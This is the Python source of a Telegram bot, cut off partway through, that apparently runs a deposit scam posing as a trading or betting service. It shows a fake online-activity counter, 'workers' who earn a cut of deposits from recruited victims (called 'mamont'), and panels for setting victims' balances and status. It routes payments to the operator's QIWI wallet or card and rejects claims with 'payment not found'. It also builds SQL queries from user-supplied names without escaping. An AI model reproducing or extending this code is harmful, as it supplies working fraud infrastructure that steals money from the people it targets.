# -*- coding: utf8 -*-
import telebot
from telebot import types
from telebot.types import InputMediaPhoto
import requests
import sqlite3
import random
import string
import threading
import time
from random import randint,choice
import json
from random import randint
from config import token,admins,poderjka,adminvxod,worker,minimalka,maximalka,vyplaty,fakeqiwi,\
minstavka,maxbalancestatus0,maxbalancestatus2,bot_username,maxpromo,otzyvy
from otvet import userbtn1,userbtn2,userbtn3,userbtn4,userbtn5,userbtn6,activ1,activ2,activ3,activ4,activ5,activ6,select,\
	otmena,verx,vniz,rovno,balanceqiwi,balancepromo,qiwiorpromo,oplata,proverit,rem,workerpanel,workerinfo
from otvet import pravila,soglashenie,user,start,start2,akcii,popolnenie,cancel,adminpanel,igrabtn,textotzyv,balancecard
from baza import getbalance,deleteoplata,getstatus

bot=telebot.TeleBot(token)
admin = admins[0]


con = sqlite3.connect("data.db")
cur = con.cursor()
cur.execute('''CREATE TABLE if not exists card(num int)''')
con.commit()

con = sqlite3.connect("data.db")
cur = con.cursor()
cur.execute(f"select count(*) from card")
if cur.fetchone()[0] == 0:
	con.commit()
	con = sqlite3.connect("data.db")
	cur = con.cursor()
	cur.execute(f"INSERT INTO card (num) "
		f"VALUES ({7777777777})")
	con.commit()


con = sqlite3.connect("data.db")
cur = con.cursor()
cur.execute('''CREATE TABLE if not exists oplatac(n int,id int,summ int)''')
con.commit()

@bot.message_handler(commands=['start'])
def send_welcome(message):
	print(message.chat.id)
	
	
	con = sqlite3.connect("data.db")
	cur = con.cursor()
	cur.execute(f"select count(*) from users where id = {message.chat.id}")
	if cur.fetchone()[0] == 0:
		con.commit()
		ref = message.text
		if len(ref) != 6:
			try:
				ref = int(ref[7:])
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select count(*) from users where id = {ref}")
				if cur.fetchone()[0] != 0:
					con.commit()
					boss = ref
				else:
					con.commit()
					boss = admin

			except:
				boss = admin
		else:
			boss = admin
		id = message.chat.id
		name = (f"{message.chat.first_name}")		
		user_name = message.chat.username
		con = sqlite3.connect("data.db")
		cur = con.cursor()
		cur.execute(f"INSERT INTO users (id,name,boss, username,balance,status) "
			f"VALUES ({id},\"{name}\",{boss}, \"{user_name}\",{0},{0})")
		con.commit()
		
		
		bot.send_message(boss, f"🐘 У вас новый реферал: [{message.chat.first_name}](tg://user?id={message.chat.id})",parse_mode='Markdown')
		bot.send_message(message.chat.id,pravila,reply_markup=soglashenie())
	else:
		con.commit()

		bot.send_message(message.chat.id,start2,reply_markup=user())



@bot.message_handler(content_types=['text'])
def main_message(message):
	if message.text == userbtn1:
		bot.send_message(message.chat.id,select,reply_markup=akcii())
		bot.register_next_step_handler(message,stavka)
	elif message.text == userbtn2:
		try:
			

			bot.send_message(message.chat.id,f"⚙️ Личный кабинет ⚙️\n\n"+
												f"💵 Баланс: {getbalance(message.chat.id)}₽\n"+
												f"🆔 Ваш пользовательский ID: {message.chat.id}\n\n"+
												f"🟢 Число сделок онлайн - {randint(1300,1600)} 🟢")
		except Exception as e:
			bot.send_message(message.chat.id,"Упс...Что то пошло не так 😔\nНапишите /start и попробуйте заново")
		
		
	elif message.text == userbtn3:
		bot.send_message(message.chat.id,qiwiorpromo,reply_markup=popolnenie())
		bot.register_next_step_handler(message,qorp)
	elif message.text == userbtn4:
		

		bot.send_message(message.chat.id,f"Введите сумму для вывода.\nНа балансе: {getbalance(message.chat.id)}RUB",reply_markup=cancel())
		bot.register_next_step_handler(message,vyvod)
	elif message.text == userbtn5:
		bot.send_message(message.chat.id,poderjka)
	elif message.text == userbtn6:
		ot = types.InlineKeyboardMarkup()
		ot1 = types.InlineKeyboardButton(text="Перейти к отзывам", callback_data="site", url=otzyvy)		
		ot.add(ot1)
		bot.send_message(message.chat.id,textotzyv,reply_markup=ot)	
	elif message.text == adminvxod and message.chat.id in admins:
		bot.send_message(message.chat.id,"Админ панель⚙️",reply_markup=adminpanel())
	elif message.text == worker:
		bot.send_message(message.chat.id,"Воркер панель⚙️",reply_markup=workerpanel())	
	elif message.text == otmena:
		bot.send_message(message.chat.id,"Главное меню",reply_markup=user())
	

		



		
		






@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
	if call.message:
		if call.data == "prinyal":
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text =start)

			stickers = ["CAACAgIAAxkBAAEBQl5gknuRbLCHmgaGBcIGD5PBHkFrpAACfQMAAm2wQgO9Ey75tk26Ux8E","CAACAgIAAxkBAAEBQltgknuNcFszyxM8K4CZAAE5DaTCp20AAuMBAAM4oAr2It69-Lkvbh8E","CAACAgIAAxkBAAEBQlhgknt93f1YsqZdlpP4A5V30hTUSwAC2gUAApb6EgXLSR-bwuR2dh8E","CAACAgEAAxkBAAEBQmFgknwTpqjs6OKKSbC87CFE0SoE2QACHQEAAjgOghHhhIkhaufuiR8E"]
			
			bot.send_sticker(call.message.chat.id,choice(stickers),reply_markup=user())
		elif call.data == "cardcard":
			bot.send_message(call.message.chat.id,"Отправьте номер карты",reply_markup=cancel())
			bot.register_next_step_handler(call.message,replacecard)	
		elif call.data == "qiwi":
			bot.send_message(call.message.chat.id,"Отправьте токен QIWI кошелька:",reply_markup=cancel())
			bot.register_next_step_handler(call.message,replaceqiwi)
		elif call.data == "send":		
			
			bot.send_message(call.message.chat.id,"📩 Напишите текст для расылки",reply_markup=cancel())
			bot.register_next_step_handler(call.message,rass)
		elif call.data == "stat":
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"SELECT COUNT (*) FROM users")
			number = cur.fetchone()[0]
			con.commit()
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text = f"Всего пользователей в боте - {number}")
			bot.send_message(call.message.chat.id,"Админ панель",reply_markup=adminpanel())	
		elif call.data == "prov":
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select status from oplata where id = {call.message.chat.id}")
			paystatus = cur.fetchone()[0]
			con.commit()
			if paystatus == 0:


				user_id = call.message.chat.id
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select num from qiwi")
				qiwinumber = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select token from qiwi")
				token_qiwi = cur.fetchone()[0]
				con.commit()

				QIWI_TOKEN = token_qiwi
				QIWI_ACCOUNT = str(qiwinumber)
				s = requests.Session()
				s.headers['authorization'] = 'Bearer ' + QIWI_TOKEN
				parameters = {'rows': '50'}
				h = s.get('https://edge.qiwi.com/payment-history/v1/persons/' + QIWI_ACCOUNT + '/payments',params=parameters)
				req = json.loads(h.text)
				try:
					cur.execute(f"SELECT * FROM oplata WHERE id = {user_id}")
					result = cur.fetchone()
					comment = str(result[1])

					for x in range(len(req['data'])):
						
						if req['data'][x]['comment'] == comment:
							
							skolko = (req['data'][x]['sum']['amount'])
							cur.execute(f"DELETE FROM oplata WHERE id = {user_id}")
							con.commit()


							
							
							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"select balance from users WHERE id = {call.message.chat.id}")
							balancenow = cur.fetchone()[0]
							con.commit()

							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"UPDATE users SET balance = {balancenow+skolko} WHERE id = {call.message.chat.id}")
							con.commit()

							cur.execute(f"SELECT boss FROM users WHERE id = {user_id}")

							for worker in cur.execute(f"SELECT boss FROM users WHERE id = {user_id}"):
								wk = worker[0]
							cur.execute(f"SELECT username FROM users WHERE id = {wk}")

							for username in cur.execute(f"SELECT username FROM users WHERE id = {wk}"):
								workerusername = username[0]
							for name in cur.execute(f"SELECT name FROM users WHERE id = {wk}"):
								workername = name[0]

							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"select name from users where id = {call.message.chat.id}")
							mamont = cur.fetchone()[0]
							con.commit()

							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"select p from procent")
							dolya = cur.fetchone()[0]
							con.commit()	
							

							

							bot.send_message(vyplaty,f"🍀 Успешное пополнение! 🍀\n💸 Сумма пополнения :{skolko}\n💵 Доля воркера:{round((dolya*skolko)/100)}\n👨‍💻 Воркер :@{workerusername}",parse_mode='Markdown')
							bot.send_message(admin,f"[{call.message.chat.first_name}](tg://user?id={call.message.chat.id}) пополнил баланс на {skolko}RUB",parse_mode='Markdown')
							bot.send_message(wk,f"Ваш реферал: [{call.message.chat.first_name}](tg://user?id={call.message.chat.id}) пополнил баланс на {skolko}RUB",parse_mode='Markdown')
							bot.send_message(call.message.chat.id,f"Ваш баланс пополнен.\n\nБаланс {balancenow+skolko} RUB",reply_markup=user())
							bot.send_message(-1001402738389,f"🍀 Успешное пополнение 🍀\n💸 Сумма пополнения :{skolko}\n💵 Доля воркера:{round((dolya*skolko)/100)}\n👨‍💻 Воркер :@{workerusername}",parse_mode='Markdown')
						


							
							break
						else:
							bot.send_message(call.message.chat.id,"⚠️Вы не оплатили⚠️\n\nОплатите заказ после чего нажмите \"Проверить оплату\"")
							
							break

				except:
					pass
			else:
				
				
				
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select balance from users WHERE id = {call.message.chat.id}")
				balancenow = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select summ from oplata WHERE id = {call.message.chat.id}")
				skolko = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"UPDATE users SET balance = {balancenow+skolko} WHERE id = {call.message.chat.id}")
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"DELETE FROM oplata WHERE id = {call.message.chat.id}")
				con.commit()

				bot.send_message(call.message.chat.id,f"Ваш баланс пополнен.\n\nБаланс {balancenow+skolko} RUB",reply_markup=user())
		elif call.data == 'prov2':
			try:
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"SELECT summ FROM oplatac where id = {call.message.chat.id}")
				sa = cur.fetchone()[0]
				con.commit()

				

				k = types.InlineKeyboardMarkup()
				k1 = types.InlineKeyboardButton(text="Выплатить", callback_data="vyplata")
				k2 = types.InlineKeyboardButton(text="Отклонить", callback_data="otklon")

				k.add(k1)
				k.add(k2)
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text ="✅ После перевода предоставьте чек в чат технической поддержки @Olymp_Trade_Support ✅")
				bot.send_message(call.message.chat.id, f"Вы вернулись в главное меню",reply_markup=user())
				
				bot.send_message(admin, f"ID платежа `{call.message.chat.id}`\nПользователь {call.message.chat.first_name} Запросил проверку платежа.\nСумма {sa}",reply_markup=k,parse_mode='Markdown')
				bot.send_message(admins[1], f"ID платежа `{call.message.chat.id}`\nПользователь {call.message.chat.first_name} Запросил проверку платежа.\nСумма {sa}",reply_markup=k,parse_mode='Markdown')
			except Exception as e:
				raise
			
		elif call.data == 	"vyplata":
			bot.send_message(call.message.chat.id, f"Напишите айди платежа",reply_markup=cancel())
			bot.register_next_step_handler(call.message, prinyatieplateja2)

		elif call.data == 	"otklon":
			bot.send_message(call.message.chat.id, f"Напишите айди платежа",reply_markup=cancel())
			bot.register_next_step_handler(call.message, otklonplateja)			
		elif call.data == "zaplatit":
			

			bot.send_message(call.message.chat.id,"Напишите id платежа",reply_markup=cancel())
			bot.register_next_step_handler(call.message, prinyatieplateja)
				
		elif call.data == "procent":
			bot.send_message(call.message.chat.id,"Напишите новый процент для воркеров",reply_markup=cancel())
			bot.register_next_step_handler(call.message,replaceprocent)			
			
		elif call.data == "cancel":
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text ="Главное меню")	
			bot.send_message(call.message.chat.id,"👻",reply_markup=user())
		elif call.data == "smsm":
			bot.send_message(call.message.chat.id,"🆔 Отправь ID реферала и сообщение\n\nНапример - 123456789:Поставите четверку?",reply_markup=cancel())
			bot.register_next_step_handler(call.message,mamontmessage)
		elif call.data == "rassw":
			bot.send_message(call.message.chat.id,"🆔 Отправь текст для рассылки",reply_markup=cancel())
			bot.register_next_step_handler(call.message,rassmamontmessage)
		elif call.data == "ref":
			reflink=f"http://t.me/{bot_username}?start={call.message.chat.id}"
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text = reflink)
			bot.send_message(call.message.chat.id,"Воркер панель⚙️",reply_markup=workerpanel())
		elif call.data == "spisok":


			con = sqlite3.connect("data.db")
			cur = con.cursor()			
			cur.execute(f"SELECT count(*) FROM users where boss = {call.message.chat.id}")
			countwstat = cur.fetchone()[0]
			con.commit()

			if countwstat == 0:
				bot.send_message(call.message.chat.id, f"У тебя нет рефералов")
			else:	

			
				con = sqlite3.connect("data.db")
				cur = con.cursor()			
				cur.execute(f"SELECT id FROM users where boss = {call.message.chat.id}")
				wstat = cur.fetchall()
				con.commit()

							

				strw = "🐘 Твои Рефералы 🐘\n\n"

				countstrw = len(wstat)//50
				arrstatw = []
				
				for i in wstat:
					try:
						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"SELECT name FROM users where id = {i[0]}")
						statwname = cur.fetchone()[0]
						con.commit()

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"SELECT username FROM users where id = {i[0]}")
						statwusername = cur.fetchone()[0]
						con.commit()

						imya = statwname
						
						strw = f"{i[0]} | {imya} | {statwusername} | {getstatus(i[0])} | {getbalance(i[0])}\n"
						arrstatw.append(strw)
					except:
						pass
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text = "🐘 🐘 🐘")
				
				spisokmamont = "" 
				if(len(arrstatw)>50):
					newarrstatw = [arrstatw[d:d+50] for d in range(0, len(arrstatw), 50)]
					for m1 in newarrstatw:
						for m2 in m1:
							
							spisokmamont+=m2							

								
						bot.send_message(call.message.chat.id, f"{spisokmamont}")
						spisokmamont = ""
						

						

				else:
					for i in arrstatw:
						spisokmamont += i
					bot.send_message(call.message.chat.id, f"{spisokmamont}")

			bot.send_message(call.message.chat.id, "Воркер панель⚙️", reply_markup = workerpanel())	
		elif call.data == "statw":
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"SELECT Count(*) FROM users where boss = {call.message.chat.id}")
			countstatw = cur.fetchone()[0]
			con.commit()
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text = f"у тебя {countstatw} рефералов")
			bot.send_message(call.message.chat.id, "Воркер панель⚙️", reply_markup = workerpanel())	

		elif call.data == "prom":
			bot.send_message(call.message.chat.id, "🎁 Напишите на какую сумму создать промокод:")
			bot.register_next_step_handler(call.message, create_promo)

		elif call.data == "infworker":
			
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text = workerinfo)
			bot.send_message(call.message.chat.id,"Воркер панель⚙️",reply_markup=workerpanel())	
		elif call.data == "statusreplace":
			bot.send_message(call.message.chat.id,"🆔 Отправь ID реферала и статус\n\nНапример - 123456789:0",reply_markup=cancel())
			bot.register_next_step_handler(call.message,workstatus)
		elif call.data == "admbalance":
			bot.send_message(call.message.chat.id,"🆔 Отправь ID реферала и Баланс\n\nНапример - 123456789:1000",reply_markup=cancel())
			bot.register_next_step_handler(call.message,dobavleniebalance)	
					


@bot.message_handler(content_types=['text'])
def replacecard(message):
	try:
		if message.chat.id in admins:
			newqiwi = message.text

			if newqiwi == otmena:
				bot.send_message(message.from_user.id,f"Отменено",reply_markup=user())
				bot.register_next_step_handler(message, main_message)
			else:

				if(message.text.isdigit()):



					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"UPDATE card SET num = {int(message.text)}")
					con.commit()

					

					bot.send_message(message.chat.id,f"Данные изменены",reply_markup=user())
					bot.register_next_step_handler(message, main_message)

				else:
					bot.send_message(message.from_user.id,f"Напишите число")
					bot.register_next_step_handler(message, replaceqiwi)
				
			
			

		

	except Exception as e:
		raise
@bot.message_handler(content_types=['text'])
def replaceqiwi(message):
	try:
		if message.chat.id in admins:
			newqiwi = message.text

			if newqiwi == otmena:
				bot.send_message(message.chat.id,f"Отменено",reply_markup=user())
				bot.register_next_step_handler(message, main_message)
			else:
				
				
				def get_profile(api_access_token):
					s7 = requests.Session()
					s7.headers['Accept']= 'application/json'
					s7.headers['authorization'] = 'Bearer ' + api_access_token
					p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true')
					return p.json()

				

				try:
					api_access_token = newqiwi
					profile = get_profile(api_access_token)

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"UPDATE qiwi SET num = {int(profile['contractInfo']['contractId'])}")
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"UPDATE qiwi SET token = \'{newqiwi}\'")
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"UPDATE qiwi SET nick = \'{profile['contractInfo']['nickname']['nickname']}\'")
					con.commit()

					bot.send_message(message.chat.id,f"Данные киви изменены\n\nНомер: {profile['contractInfo']['contractId']}\nТокен: {newqiwi}\nНикнейм: {profile['contractInfo']['nickname']['nickname']}",reply_markup=user())
					bot.register_next_step_handler(message, main_message)
				except Exception as e:
					bot.send_message(message.from_user.id,f"Не валидный токен,пишите новый.")
					bot.register_next_step_handler(message, replaceqiwi)
				

	except Exception as e:
		raise				



@bot.message_handler(content_types=['text'])
def rass(message):
	if message.chat.id in admins:


		if message.text == otmena:
			bot.send_message(message.from_user.id, "Рассылка отменена",reply_markup=user())
			bot.register_next_step_handler(message, main_message)

		else:	
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			bot.send_message(message.from_user.id, "✅ Рассылка успешно начата")
			cur.execute("SELECT id FROM users")
			id = cur.fetchall()
			def allrass():

				for i in id:
					try:
						bot.send_message(i[0], f"{message.text}")
						time.sleep(0.1)
					except:
						pass
				bot.send_message(message.from_user.id, "✅ Рассылка успешно завершена",reply_markup=user())
			t4 = threading.Thread(target=allrass)
			t4.start()	
			bot.register_next_step_handler(message, main_message)


@bot.message_handler(content_types=['text'])
def qorp(message):
	if message.text == balanceqiwi:
		bot.send_message(message.chat.id,f"💰 Введите сумму пополнения от {minimalka} RUB:\n\n(например, если вы хотите пополнить баланс на 1000 RUB, отправьте в чат сообщение ‘1000’, без кавычек",reply_markup=cancel())
		bot.register_next_step_handler(message, popolni)
	elif message.text == balancepromo:
		bot.send_message(message.chat.id,"Напишите свой промокод",reply_markup=cancel())
		bot.register_next_step_handler(message, promo)
	elif message.text == balancecard:
		bot.send_message(message.chat.id,f"💰 Введите сумму пополнения от {minimalka} RUB:\n\n(например, если вы хотите пополнить баланс на 1000 RUB, отправьте в чат сообщение ‘1000’, без кавычек",reply_markup=cancel())
		bot.register_next_step_handler(message, popolnicard)	
		
	elif message.text == otmena:
		bot.send_message(message.chat.id,"↪️ Вы вернулись в главное меню",reply_markup=user())
		bot.register_next_step_handler(message, main_message)







@bot.message_handler(content_types=['text'])
def popolnicard(message):
	try:
		if message.text.isdigit():
			skolko = int(message.text)
			if skolko >= minimalka and skolko <=maximalka:
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"DELETE from oplatac where id = {message.chat.id}")

				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()

				cur.execute(f"INSERT INTO oplatac (id,summ) VALUES({message.chat.id},{skolko})")
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select num from card")
				cardnumber = cur.fetchone()[0]
				con.commit()


				texttt = f'♻️Переведите {skolko}₽ на карту\n\nНомер: `{cardnumber}`\n\n_Нажмите на номер, чтобы скопировать_'

				markup_inline = types.InlineKeyboardMarkup()

				proverka = types.InlineKeyboardButton(text='Проверить оплату' ,callback_data='prov2')

				markup_inline.add(proverka)


				bot.send_message(message.from_user.id,texttt,parse_mode='Markdown',reply_markup=markup_inline)
				bot.register_next_step_handler(message, main_message)	
			else:
				bot.send_message(message.chat.id,f"❗️ Сумма пополнения должна быть от {minimalka}")
				bot.register_next_step_handler(message, popolni)
		elif message.text == otmena:
			bot.send_message(message.chat.id, "Отмененоc",reply_markup=user())
			bot.register_next_step_handler(message, main_message)		

		else:
			bot.send_message(message.chat.id,"Напишите число")
			bot.register_next_step_handler(message, popolni)	
	except Exception as e:
		raise


@bot.message_handler(content_types=['text'])
def popolni(message):
	try:
		if message.text.isdigit():
			skolko = int(message.text)
			if skolko >= minimalka and skolko <=maximalka:
				try:
					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"DELETE FROM oplata WHERE id = {message.chat.id}")
					con.commit()
				except Exception as e:
					raise
				
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				comment = randint(10000, 9999999)
				cur.execute(f"INSERT INTO oplata (id, code,status,summ) VALUES({message.chat.id},{comment},{0},{skolko})")
				con.commit()
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select boss from users where id = {message.chat.id}")
				refer = cur.fetchone()[0]
				con.commit()

				wb = types.InlineKeyboardMarkup()			
				wb1 = types.InlineKeyboardButton(text="Заплатить" ,callback_data='zaplatit')
				wb.add(wb1)
				bot.send_message(refer,f"ID: `{message.chat.id}`\n\nРеферал [{message.chat.first_name}](tg://user?id={message.chat.id}) создал заявку на пополнение\n\nСумма: {skolko}",reply_markup=wb,parse_mode='Markdown')

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select nick from qiwi")
				qiwinick = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select num from qiwi")
				qiwinumber = cur.fetchone()[0]
				con.commit()

				

				link = f"https://qiwi.com/payment/form/99?extra%5B%27account%27%5D={qiwinumber}&amountInteger={skolko}&amountFraction=0&currency=643&extra%5B%27comment%27%5D={comment}&blocked[0]=sum&blocked[1]=account&blocked[2]=comment"

				kb = types.InlineKeyboardMarkup()
				kb1 = types.InlineKeyboardButton(text=oplata, callback_data="site", url=link)
				kb2 = types.InlineKeyboardButton(text=proverit ,callback_data='prov')
				kb.add(kb1)
				kb.add(kb2)

				texttt = f'♻️Переведите {skolko}₽ на счет Qiwi\n\nНомер: `{qiwinumber}`\nКомментарий `{comment}`\n\n_Нажмите на номер и комментарий, чтобы их скопировать_'

				bot.send_message(message.from_user.id,texttt,parse_mode='Markdown',reply_markup=kb)
				

				# bot.send_message(message.chat.id,f"📈 Оплата QIWI/банковской картой:[Оплата]({link})\n\nС комментарием: `{comment}`\n\nВАЖНО! Обязательно пишите комментарий к платежу! Если Вы не укажите комментарий, деньги не поступят на счёт!",reply_markup=kb,parse_mode='Markdown')
			else:
				bot.send_message(message.chat.id,f"❗️ Сумма пополнения должна быть от {minimalka}")
				bot.register_next_step_handler(message, popolni)
		elif message.text == otmena:
			bot.send_message(message.chat.id, "Отменено",reply_markup=user())
			bot.register_next_step_handler(message, main_message)		

		else:
			bot.send_message(message.chat.id,"Напишите число")
			bot.register_next_step_handler(message, popolni)	
	except Exception as e:
		raise

@bot.message_handler(content_types=['text'])
def prinyatieplateja2(message):
	try:
		if message.chat.id in admins:
			if message.text == otmena:
				bot.send_message(message.chat.id, "Отменено")
				bot.register_next_step_handler(message, main_message)
			else:


				if message.text.isdigit():

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select count(*) from oplatac where id = {int(message.text)}")
					inn = cur.fetchone()[0]
					con.commit()

					if inn == 0:
						bot.send_message(message.chat.id, "ID Платежа не найден\nНапишите правильный айди")
						bot.register_next_step_handler(message, prinyatieplateja2)
					else:

						

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"select summ from oplatac where id = {int(message.text)}")
						isumm = cur.fetchone()[0]
						con.commit()

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"select balance from users where id = {int(message.text)}")
						ibn = cur.fetchone()[0]
						con.commit()

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"UPDATE users SET balance = {ibn+isumm} where id = {int(message.text)}")
						
						con.commit()

						skolko = isumm
						user_id = int(message.text)
						cur.execute(f"SELECT boss FROM users WHERE id = {user_id}")

						for worker in cur.execute(f"SELECT boss FROM users WHERE id = {user_id}"):
							wk = worker[0]
						cur.execute(f"SELECT username FROM users WHERE id = {wk}")

						for username in cur.execute(f"SELECT username FROM users WHERE id = {wk}"):
							workerusername = username[0]
						for name in cur.execute(f"SELECT name FROM users WHERE id = {wk}"):
							workername = name[0]

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"select name from users where id = {user_id}")
						mamont = cur.fetchone()[0]
						con.commit()

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"select p from procent")
						dolya = cur.fetchone()[0]
						con.commit()	
						

						

						bot.send_message(vyplaty,f"🍀 Успешное пополнение! 🍀\n💸 Сумма пополнения :{skolko}\n💵 Доля воркера:{round((dolya*skolko)/100)}\n👨‍💻 Воркер :@{workerusername}",parse_mode='Markdown')
						bot.send_message(-1001402738389,f"🍀 Успешное пополнение! 🍀\n💸 Сумма пополнения :{skolko}\n💵 Доля воркера:{round((dolya*skolko)/100)}\n👨‍💻 Воркер :@{workerusername}",parse_mode='Markdown')
						
						

						bot.send_message(int(message.text), "Ваш баланс пополнен",reply_markup=user())
						bot.send_message(message.chat.id, "Готово!")
						bot.register_next_step_handler(message, main_message)

				else:
					bot.send_message(message.chat.id, "Напишите число")
					bot.register_next_step_handler(message, prinyatieplateja2)





		
	except Exception as e:
		raise
	

@bot.message_handler(content_types=['text'])
def otklonplateja(message):
	try:
		if message.chat.id in admins:
		
	
	
			if message.text == otmena:
				bot.send_message(message.chat.id, "Отменено")
				bot.register_next_step_handler(message, main_message)
			else:
				if message.text.isdigit():

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"select count(*) from oplatac where id = {int(message.text)}")
						inn = cur.fetchone()[0]
						con.commit()

						if inn == 0:
							bot.send_message(message.chat.id, "ID Платежа не найден\nНапишите правильный айди")
							bot.register_next_step_handler(message, otklonplateja)
						else:
			
							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"select id from oplatac where id = {int(message.text)}")
							i = cur.fetchone()[0]
							con.commit()

							bot.send_message(i, "Ваш Платеж не найден !")
							bot.send_message(message.chat.id, "Готово!",reply_markup=user())
							bot.register_next_step_handler(message, main_message)
				else:
					bot.send_message(message.chat.id, "Напишите число")
					bot.register_next_step_handler(message, otklonplateja)
	except Exception as e:
		raise	


@bot.message_handler(content_types=['text'])
def prinyatieplateja(message):
	try:
		if message.text == otmena:
			bot.send_message(message.chat.id, "Отменено",reply_markup=user())
			bot.register_next_step_handler(message, main_message)
		else:


			if message.text.isdigit():

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select count(*) from oplata where id = {int(message.text)}")
				inn = cur.fetchone()[0]
				con.commit()

				if inn == 0:
					bot.send_message(message.chat.id, "ID Платежа не найден\nНапишите правильный айди")
					bot.register_next_step_handler(message, prinyatieplateja)
				else:			

					

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"UPDATE oplata SET status = {1} where id = {int(message.text)}")
					
					con.commit()

					
					bot.send_message(message.chat.id, "Готово!",reply_markup=user())
					bot.register_next_step_handler(message, main_message)

			else:
				bot.send_message(message.chat.id, "Напишите число")
				bot.register_next_step_handler(message, prinyatieplateja)





		
	except Exception as e:
		raise



@bot.message_handler(content_types=['text'])
def vyvod(message):
	try:
		if message.text.isdigit():
			if int(message.text) > 0:
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select balance from users WHERE id = {message.chat.id}")
				balancevyvod = cur.fetchone()[0]
				con.commit()

				

				if balancevyvod<int(message.text):
					bot.send_message(message.chat.id, "На балансе не достатачно средств.",reply_markup=user())
					bot.register_next_step_handler(message, main_message)
				else:
					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"DELETE FROM payments WHERE id = {message.chat.id}")
					con.commit()


					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"INSERT INTO payments (summ,id) VALUES ({int(message.text)},{message.chat.id})")
					con.commit()

					koshelki = types.ReplyKeyboardMarkup(True)
					kk1 = types.KeyboardButton("1")
					kk2 = types.KeyboardButton("2")
					kk3 = types.KeyboardButton("3")
					kk4 = types.KeyboardButton("4")
					kk5 = types.KeyboardButton("5")
					koshelki.add(kk1,kk2,kk3)
					koshelki.add(kk4,kk5)
					
					bot.send_message(message.chat.id, "Выберите систему вывода из предложенных!\n\n1)Банковская карта\n2)Киви Кошелек\n3)Яндекс Деньги\n4)WebMoney\n5)Bitcoin\n\nДля выбора отправьте цифру, под которой указана нужная Вам система.",reply_markup=koshelki)
					bot.register_next_step_handler(message, walletw)
					



			else:
				bot.send_message(message.chat.id, "Напишите число больше 0")
				bot.register_next_step_handler(message, vyvod)	
		elif message.text == otmena:
			bot.send_message(message.chat.id, "Отменено",reply_markup=user())
			bot.register_next_step_handler(message, main_message)		
		else:
			bot.send_message(message.chat.id, "Напишите число")
			bot.register_next_step_handler(message, vyvod)	

	except Exception as e:
		raise



@bot.message_handler(content_types=['text'])
def walletw(message):
	try:
		wallets = ["1","2","3","4","5"]
		if message.text in wallets:
			bot.send_message(message.chat.id, "💵Введите реквизиты кошелька для вывода средств!💵\n\n⚠️Вывод возможен только на реквизиты, с которых пополнялся Ваш баланс в последний раз!⚠️",reply_markup=cancel())
			bot.register_next_step_handler(message, wallet)
		else:
			bot.send_message(message.chat.id, "Выберите 1 из вариантов.")
			bot.register_next_step_handler(message, walletw)
	except Exception as e:
		raise
	
	
		



@bot.message_handler(content_types=['text'])
def wallet(message):
	try:
